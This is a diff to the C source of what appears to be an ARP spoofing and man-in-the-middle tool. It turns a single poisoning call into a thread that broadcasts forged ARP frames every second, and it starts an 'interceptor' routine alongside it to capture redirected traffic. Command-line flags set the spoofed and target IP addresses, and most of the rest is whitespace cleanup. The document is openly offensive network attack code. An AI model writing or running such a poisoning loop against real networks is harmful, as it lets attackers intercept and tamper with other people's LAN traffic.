@@ -2,6 +2,7 @@
 #include "parsers.h"
 #include "sock_ops.h"
 #include "packet_builders.h"
+#include "interceptor.c"
 
 #include <unistd.h>
 #include <sys/ioctl.h>
@@ -41,12 +42,17 @@ static struct option long_options[] =
   {0, 0, 0, 0}
 };
 
+struct arg {
+    int sock;
+    struct arp_pac * packet;
+};
+
 void print_help();
 void recv_func(void* conn);
-void mitm_attk(int sock, struct arp_pac *packet);
+void * arp_poison_worker(void *);
 
 int main(int argc, char *argv[]) {
-    
+
     opterr = 0;
     if(argc == 1){
         print_help();
@@ -55,7 +61,7 @@ int main(int argc, char *argv[]) {
     while((c = getopt_long(argc, argv, "01i:v:s:", long_options,
                            &options_index)) != -1){
         switch(c){
-            case '0': 
+            case '0':
                 mitm_mode = 1;
                 break;
             case '1':
@@ -65,13 +71,13 @@ int main(int argc, char *argv[]) {
                 strncpy(if_name, optarg, IFNAMSIZ);
                 break;
             case 'v':
-                if(inet_pton(AF_INET, optarg, &spa) == 0){ 
+                if(inet_pton(AF_INET, optarg, &spa) == 0){
                     printf("Enter valid IP format\n");
                     exit(1);
                 }
                 break;
             case 's':
-                if(inet_pton(AF_INET, optarg, &tpa) == 0){ 
+                if(inet_pton(AF_INET, optarg, &tpa) == 0){
                     printf("Enter valid IP format\n");
                     exit(1);
                 }
@@ -81,7 +87,7 @@ int main(int argc, char *argv[]) {
                 exit(1);
         }
     }
-    
+
     int sock = make_socket(if_name);
 
     if_index = get_if_index(sock, if_name);
@@ -91,12 +97,20 @@ int main(int argc, char *argv[]) {
     inet_pton(AF_INET, argv[3], &tpa);
 
     hwaddr = get_if_hwaddr(sock, if_name);
-    
+
     struct arp_pac packet = build_arp_request(spa, tpa, hwaddr);
-    
-    if(mitm_mode)
-        mitm_attk(sock, &packet);
-    
+
+    if (mitm_mode) {
+        pthread_t pid;
+        struct arg * argument = malloc(sizeof(struct arg));
+        argument->sock = sock;
+        argument->packet = &packet;
+
+        pthread_create(&pid, NULL, &arp_poison_worker, argument);
+        printf("running interseption\n");
+        interceptor(NULL);
+    }
+
     if(hosts_mode){
         uint32_t my_addr = htonl(get_if_addr(sock, if_name));
         memcpy(packet.spa, &my_addr, sizeof(uint8_t) * 4);
@@ -136,12 +150,18 @@ void print_help(){
 }
 
 void recv_func(void* conn){
-    
+
     while(1){
         recv_frame(*((int*)conn));
     }
 }
 
-void mitm_attk(int sock, struct arp_pac *packet){
-    broadcast_frame(sock, packet);
+void * arp_poison_worker(void * arg) {
+    struct arg * argument = arg;
+
+    while (1) {
+        broadcast_frame(argument->sock, argument->packet);
+        // printf("spoof\n");
+        sleep(1);
+    }
 }
